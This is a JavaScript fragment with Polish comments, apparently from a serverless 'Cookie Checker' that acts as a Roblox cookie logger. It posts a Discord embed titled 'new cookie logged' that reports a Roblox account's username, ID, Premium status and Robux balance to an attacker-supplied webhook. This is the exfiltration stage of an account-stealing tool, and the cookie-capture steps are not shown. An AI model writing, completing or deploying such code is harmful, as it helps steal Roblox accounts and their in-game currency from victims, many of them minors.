    // 5. Wysyłka do Discord Webhook
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    console.log('Webhook URL exists?', !!webhookUrl);           // ← to zobaczysz w Vercel logs
    console.log('Webhook URL (pierwsze 30 znaków):', webhookUrl?.slice(0, 30)); // bezpieczeństwo

    if (webhookUrl) {
      try {
        const embed = {
          title: "🔓 Nowe cookie zalogowane!",
          color: hasPremium ? 0x00ff9d : 0x1e90ff,
          fields: [
            { name: "Username", value: userData.name || "?", inline: true },
            { name: "Display Name", value: userData.displayName || "?", inline: true },
            { name: "User ID", value: userId.toString() || "?", inline: true },
            { name: "Premium", value: hasPremium ? "✅ TAK" : "❌ NIE", inline: true },
            { name: "Robux", value: robux.toLocaleString() + " ₪", inline: true },
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "Cookie Checker • " + new Date().toLocaleString('pl-PL') }
        };

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [embed],
            username: "Roblox Logger",
            avatar_url: "https://i.imgur.com/xyz.png" // opcjonalne
          })
        });

        console.log('Webhook status:', response.status, response.statusText);

        if (!response.ok) {
          const errorText = await response.text();
          console.error('Webhook error:', errorText);
        }
      } catch (webhookErr) {
        console.error('Webhook send failed:', webhookErr.message);
      }
    } else {
      console.log('Brak DISCORD_WEBHOOK_URL – nic nie wysyłamy');
    }
